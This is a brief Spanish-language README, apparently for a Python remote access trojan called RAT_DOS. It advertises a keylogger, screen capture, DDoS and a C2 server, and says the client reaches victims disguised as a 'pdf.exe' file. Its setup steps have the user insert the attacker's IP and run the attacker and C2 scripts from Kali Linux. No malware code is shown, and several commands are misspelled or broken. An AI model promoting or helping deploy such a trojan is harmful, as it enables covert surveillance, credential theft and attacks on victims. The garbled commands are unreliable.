# RAT_DOS
Rat con C2
Este es un RAT para ubunto con keyloger, captutra de panatalla y ataque de ddos entra como un ejecutable en un pdf.exe y ya tienes acceso remoto a la victima en 100% python 

```sh
install apt python
python --version
```

Cambiar la IP, y poner la del atacante 
```sh
nano cliente.p
```

Saber ip del atacante en kali linux
```sh
hostname -l
```
Ejecutar el programa
```sh
Python3 ---.py`
```


Ejecutable desde Kali linux en una carpeta llamar `Proyecto rat` y tener los script juntos tanto atacante.py y c2.py

```sh
mkdir proyecto rat
```
